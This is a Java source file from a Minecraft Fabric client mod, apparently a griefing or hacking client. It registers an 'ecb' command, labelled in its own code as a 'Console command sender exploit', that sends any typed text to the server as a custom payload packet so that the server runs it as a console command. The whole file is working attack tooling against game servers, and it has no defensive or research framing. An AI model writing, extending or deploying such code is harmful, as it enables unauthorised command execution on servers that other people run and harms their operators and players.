package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientprivate.packets.ECBPayloadPacket;
import io.github.spigotrce.paradiseclientprivate.packets.SignedVelocityPayloadPacket;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

public class ECBCommand extends Command {
    public ECBCommand(MinecraftClient minecraftClient) {
        super("ecb", "Console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        return literal(getName())
                .executes(context -> {
                    Helper.printChatMessage("Incomplete command!");
                    return SINGLE_SUCCESS;
                })
                .then(ClientCommandManager.argument("command", StringArgumentType.greedyString())
                        .executes(context -> {
                            Helper.sendPacket(new CustomPayloadC2SPacket(
                                    new ECBPayloadPacket(context.getArgument("command", String.class))));
                            Helper.printChatMessage("Payload sent!");
                            return SINGLE_SUCCESS;
                        })
                );
    }
}
